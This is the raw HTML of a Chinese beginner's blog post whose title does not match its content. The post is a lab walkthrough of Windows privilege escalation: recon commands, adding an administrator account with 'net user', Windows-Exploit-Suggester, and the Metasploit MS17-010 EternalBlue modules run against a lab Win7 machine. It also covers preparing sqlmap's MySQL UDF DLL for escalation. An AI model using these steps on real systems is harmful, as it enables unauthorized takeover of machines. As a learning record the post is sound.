<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="m0re"><meta name="copyright" content="m0re"><meta name="generator" content="Hexo 5.1.0"><meta name="theme" content="hexo-theme-yun"><title>.github.io的个人博客网站无法连接问题 | m0re的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="none" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.19/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_stqaphw3j4.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script defer src="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.css"><script defer src="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/auto-render.min.js"></script><script>document.addEventListener("DOMContentLoaded", function() {
  renderMathInElement(document.body, {
    delimiters: [
      {left: "$$", right: "$$", display: true},
      {left: "$", right: "$", display: false},
      {left: "\\(", right: "\\)", display: false},
      {left: "\\[", right: "\\]", display: true}
    ]
  });
});</script><link rel="shortcut icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"root":"/","title":"人生路漫漫","version":"0.9.7","anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><meta name="description" content="前言小白一枚，之前听过的比较厉害的操作就是提权，维权。今天学习一下。 权限提升提权本质提权本质就是提升自己在服务器中的权限，获得更大的权限。例如：在Windows系统下普通用户，通过提权获得Administrator一样的权限；在linux中通过执行编译后的程序，从普通用户权限提升到root账号权限。 提权分类第一种分类：  本地提权当前登录到系统是一个普通用户，通过在本地执行的操作和程序来获得更">
<meta property="og:type" content="article">
<meta property="og:title" content=".github.io的个人博客网站无法连接问题">
<meta property="og:url" content="https://zxcv0221.github.io/2020/08/23/windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%8F%90%E6%9D%83%E3%80%81MySQL%20UDF%E6%8F%90%E6%9D%83/index.html">
<meta property="og:site_name" content="m0re的小站">
<meta property="og:description" content="前言小白一枚，之前听过的比较厉害的操作就是提权，维权。今天学习一下。 权限提升提权本质提权本质就是提升自己在服务器中的权限，获得更大的权限。例如：在Windows系统下普通用户，通过提权获得Administrator一样的权限；在linux中通过执行编译后的程序，从普通用户权限提升到root账号权限。 提权分类第一种分类：  本地提权当前登录到系统是一个普通用户，通过在本地执行的操作和程序来获得更">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200701141517806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200701141914592.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200701143646121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200701162447397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200701163236242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200701164359235.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200701175902929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200701183915508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200701184210678.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200701184336892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200701184708439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200701184803670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200701192730719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200701192839480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200701193333804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200701193518188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70">
<meta property="article:published_time" content="2020-08-23T08:31:57.626Z">
<meta property="article:modified_time" content="2020-08-23T09:24:43.292Z">
<meta property="article:author" content="m0re">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="提权">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200701141517806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="m0re"><img width="96" loading="lazy" src="/img/avatar.jpg" alt="m0re"></a><div class="site-author-name"><a href="/about/">m0re</a></div><a class="site-name" href="/about/site.html">m0re的小站</a><sub class="site-subtitle"></sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">65</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">0</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">21</span></a></div><a class="site-state-item hty-icon-button" href="/custom/" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/zxcv0221" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://blog.csdn.net/qq_45836474" title="CSDN" target="_blank" style="color:#E6162D"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-telegram-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.cnblogs.com/Augenstern-blog/" title="博客园" target="_blank" style="color:#007722"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/ISm0r3" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:wfulaj4y@gmail.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%9C%AC%E8%B4%A8"><span class="toc-number">1.1.</span> <span class="toc-text">提权本质</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E5%88%86%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">提权分类</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4"><span class="toc-number">2.</span> <span class="toc-text">windows系统提权基础命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#windows%E6%8F%90%E6%9D%83%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7"><span class="toc-number">3.</span> <span class="toc-text">windows提权辅助工具</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D"><span class="toc-number">3.1.</span> <span class="toc-text">辅助工具介绍</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#windows%E8%BF%9C%E7%A8%8B%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">windows远程提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E6%89%8B%E6%93%8D%E4%BD%9C%E4%B8%80%E4%B8%8B"><span class="toc-number">4.1.</span> <span class="toc-text">上手操作一下</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql-UDF%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">Mysql UDF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#udf%E4%BB%8B%E7%BB%8D"><span class="toc-number">5.1.</span> <span class="toc-text">udf介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#udf-dll%E8%8E%B7%E5%8F%96"><span class="toc-number">5.2.</span> <span class="toc-text">udf.dll获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0udf"><span class="toc-number">5.3.</span> <span class="toc-text">上传udf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E6%8F%90%E6%9D%83%E5%91%BD%E4%BB%A4"><span class="toc-number">5.4.</span> <span class="toc-text">执行提权命令</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://zxcv0221.github.io/2020/08/23/windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%8F%90%E6%9D%83%E3%80%81MySQL%20UDF%E6%8F%90%E6%9D%83/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="m0re"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="m0re的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">.github.io的个人博客网站无法连接问题</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="创建时间：2020-08-23 16:31:57" itemprop="dateCreated datePublished" datetime="2020-08-23T16:31:57+08:00">2020-08-23</time></div><span class="leancloud_visitors" id="/2020/08/23/windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%8F%90%E6%9D%83%E3%80%81MySQL%20UDF%E6%8F%90%E6%9D%83/" data-flag-title=".github.io的个人博客网站无法连接问题"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-tag"><a class="tag" href="/tags/Web/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">Web</span></a><a class="tag" href="/tags/%E6%8F%90%E6%9D%83/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">提权</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><p>前言<br>小白一枚，之前听过的比较厉害的操作就是提权，维权。今天学习一下。</p>
<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="提权本质"><a href="#提权本质" class="headerlink" title="提权本质"></a>提权本质</h2><p>提权本质就是提升自己在服务器中的权限，获得更大的权限。<br>例如：在Windows系统下普通用户，通过提权获得Administrator一样的权限；在linux中通过执行编译后的程序，从普通用户权限提升到root账号权限。</p>
<h2 id="提权分类"><a href="#提权分类" class="headerlink" title="提权分类"></a>提权分类</h2><p>第一种分类：</p>
<ul>
<li>本地提权<br>当前登录到系统是一个普通用户，通过在本地执行的操作和程序来获得更高的权限</li>
<li>远程提权<br>远程提权是指在远程的机器上对目标服务器进行对应操作和执行程序对目标系统发送数据包，针对目标系统所存在的漏洞来获得最高的权限Administrator或者root。<br>第二种分类</li>
<li>系统提权<br>针对系统的弱点或者漏洞来提升应的权限</li>
<li>第三方软件提权<br>利用系统上安装的一些软件(下载的)，通过这些软件来提升权限。<h1 id="windows系统提权基础命令"><a href="#windows系统提权基础命令" class="headerlink" title="windows系统提权基础命令"></a>windows系统提权基础命令</h1></li>
<li>获取IP地址信息<br>IP地址是计算机在网络中的门牌号，用来寻找计算机的地址。同一台计算机有多个IP地址，可以有外部连接的IP地址，内部IP地址。</li>
</ul>
<p>在提权过程中，如果有外网IP地址，可以直接使用3389端口进行远程桌面连接。<br>在windows系统下使用 <code>ipconfig /all</code>查看网卡信息。<br>ipconfig获取的信息其实是不全面的，加个<code>/all</code>可以查看全部网卡信息。一般192.168开头的是私网地址。</p>
<ul>
<li>获取端口信息<br>端口是计算机与外部连接的一个接口，每个开放的服务对应一个端口。<br>windows系统下可以使用netstat命令获取端口开放状态。<br><code>netstat -an</code>获取当前主机所有端口的开放情况及网络连接情况。</li>
<li>获取服务信息和进程信息<br>在windows系统下可以使用<code>tasklist /svc</code>命令获取运行的进程名称、服务、和PID。</li>
<li><a target="_blank" rel="noopener" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">添加链接描述</a>进程结束、用户管理命令</li>
</ul>
<p>1.使用<code>taskkill</code>来结束进程。<code>taskkill /?</code>获取帮助信息。<br>2.在windows系统下，系统访问需要有对应的用户和密码。<br>可以通过以下命令添加用户</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user username password /add</span><br><span class="line">net localgroup administrator username /add</span><br></pre></td></tr></table></figure>
<h1 id="windows提权辅助工具"><a href="#windows提权辅助工具" class="headerlink" title="windows提权辅助工具"></a>windows提权辅助工具</h1><h2 id="辅助工具介绍"><a href="#辅助工具介绍" class="headerlink" title="辅助工具介绍"></a>辅助工具介绍</h2><p>Windows-Exploit-Suggester此工具将目标补丁与Microsoft漏洞数据库进行比较，以检测目标上潜在的缺失补丁。<br>github项目地址——🔑<a target="_blank" rel="noopener" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">传送门</a><br>安装环境：python2.7、安装xlrd模块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#只有一个python2的环境</span></span><br><span class="line">python -m pip install xlrd</span><br><span class="line"><span class="comment">#同时集合python2和python3</span></span><br><span class="line">python2 -m pip install xlrd</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200701141517806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>安装成功。<br>然后执行<code>--update</code>以获取漏洞文件<br><img src="https://img-blog.csdnimg.cn/20200701141914592.png" alt="m0re" loading="lazy"><br>在文件目录下获得一个这样的文件。<br>然后获取一个本机文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
<p>然后使用命令将这些内容写入一个文件中，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo &gt; win7.txt</span><br></pre></td></tr></table></figure>
<p>生成一个win7文件，将它粘贴到辅助工具目录下。<br>使用命令进行测试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python windows-exploit-suggester.py --audit -i win7.txt -d <span class="number">2020</span><span class="number">-07</span><span class="number">-01</span>-mssb.xls</span><br></pre></td></tr></table></figure>
<p>然后对比出来一些重要漏洞<br><img src="https://img-blog.csdnimg.cn/20200701143646121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>如：MS13-055就是13年的第55个漏洞。</p>
<h1 id="windows远程提权"><a href="#windows远程提权" class="headerlink" title="windows远程提权"></a>windows远程提权</h1><p>在授权的情况下，针对目标机器进行提权。可以首先扫描系统是否存在可利用漏洞，探测是否可以利用。</p>
<p>如果可以直接获得最高权限，那么就不需要本地提权，直接远程提权拿到最高权限。<br>介绍一个漏洞ms17-010<br>ms17-010是一个安全类型的补丁，MS17-010更新修复了Microsoft Windows中的漏洞。</p>
<blockquote>
<p>WannaCry（又叫Wanna Decryptor），一种“蠕虫式”的勒索病毒软件，大小3.3MB，由不法分子利用NSA（National Security Agency，美国国家安全局）泄露的危险漏洞“EternalBlue”（永恒之蓝）进行传播。勒索病毒肆虐，俨然是一场全球性互联网灾难，给广大电脑用户造成了巨大损失。最新统计数据显示，100多个国家和地区超过10万台电脑遭到了勒索病毒攻击、感染。勒索病毒是自熊猫烧香以来影响力最大的病毒之一。</p>
</blockquote>
<p>扫描探测ms17-010漏洞<br>在metasploit下直接利用ms17-010的漏洞扫描模块进行探测。<br>利用metasploit下的<code>windows/smb/ms17_010_eternalblue</code>模块进行远程提权<br>设置完参数就可以进行攻击：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exploit				<span class="comment">#开始执行</span></span><br><span class="line">shell				<span class="comment">#使用shell命令/功能</span></span><br><span class="line">whoami				<span class="comment">#查询当前登录的用户会发现是windows最高权限system</span></span><br></pre></td></tr></table></figure>
<p>这个真的厉害，学到了。</p>
<h2 id="上手操作一下"><a href="#上手操作一下" class="headerlink" title="上手操作一下"></a>上手操作一下</h2><p>首先需要开启一台win7虚拟机，然后看一下win7的IP地址。<br>打开kali终端输入<code>msfconsole</code>启用metasploit<br>使用搜查ms17-010模块，<code>use auxiliary/scanner/smb/smb_ms17_010 </code><br>设置rhost参数：<code>set rhosts 192.168.xx.xx</code><br>然后<code>run</code><br>就可以查询当前IP是否存在漏洞了。<code>search ms17-010</code><br><img src="https://img-blog.csdnimg.cn/20200701162447397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>可以看出，这个漏洞是2017年3月14日的。<br>既然存在漏洞了，那就利用这个漏洞来进行提权操作。<br>metasploit下也集成了ms17-010的漏洞利用模块。<code>use exploit/windows/smb/ms17_010_eternalblue</code><br>当然还有其他的模块。下面这个就是win8系统的。现在我的是win7，所以就用上面的这个就行。<br><img src="https://img-blog.csdnimg.cn/20200701163236242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后设置一下rhosts就行了。好像是升级了，居然这么简单。设置好参数后直接使用<code>exploit</code>直接进行提权，等待一会。<br>过程很快的还是。直接输入<code>whoami</code><br>会发现，已经是最高权限登录到win7了<br><img src="https://img-blog.csdnimg.cn/20200701164359235.png" alt="m0re" loading="lazy"><br>成功了。</p>
<h1 id="Mysql-UDF提权"><a href="#Mysql-UDF提权" class="headerlink" title="Mysql UDF提权"></a>Mysql UDF提权</h1><h2 id="udf介绍"><a href="#udf介绍" class="headerlink" title="udf介绍"></a>udf介绍</h2><p>UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。</p>
<blockquote>
<p>在提权过程中，经常使用mysql的udf.dl进行提权。并且提权之前，要上传udf.dll到指定的目录下。使用select@@plugin_dir；或show<br>variables like’plugin%’，查看具体目录。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200701175902929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>修改目录方式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、mysqld.exe--plugin-dir=具体目录</span><br><span class="line">2、mysqld.exe--defaults-file=具体目录</span><br><span class="line">3、mysql.ini配置文件plugindir=具体目录</span><br></pre></td></tr></table></figure>
<h2 id="udf-dll获取"><a href="#udf-dll获取" class="headerlink" title="udf.dll获取"></a>udf.dll获取</h2><p>sqlmap下自带了对应提权使用的udf库。可以直接下载使用，但是sqlmap进行加密，需要解密使用。<br>sqlmap在kali中自带，可以使用下面这个方法。<br>sqlmap在<code>/root/usr/share/sqlmap</code><br>关于UDF则是在<br><img src="https://img-blog.csdnimg.cn/20200701183915508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>因为我的mysql是win32，所以选择32<br>奥，至于查看的话，在mysql命令行中使用</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @@version_compile_os;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200701184210678.png" alt="m0re" loading="lazy"><br>不过这个udf是加密的，不过sqlmap中有解密的脚本，可以直接使用，脚本在extra中的cloak中，<br><img src="https://img-blog.csdnimg.cn/20200701184336892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后就可以使用了，命令为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/<span class="number">32</span>/lib_mysqludf_sys.dll_</span><br></pre></td></tr></table></figure>
<p>不过我的使用时出问题了，忙着解决，也忘了截图了。我放弃了在linux中解密的方法，我在win7中也有sqlmap，所以我就在win7中解密了，可以成功。<br><img src="https://img-blog.csdnimg.cn/20200701184708439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后在cloak目录下生成了dll文件。<br><img src="https://img-blog.csdnimg.cn/20200701184803670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p>
<h2 id="上传udf"><a href="#上传udf" class="headerlink" title="上传udf"></a>上传udf</h2><p>将udf.dll文件上传到具体目录下。<br>具体目录上面已经说过查询方法。</p>
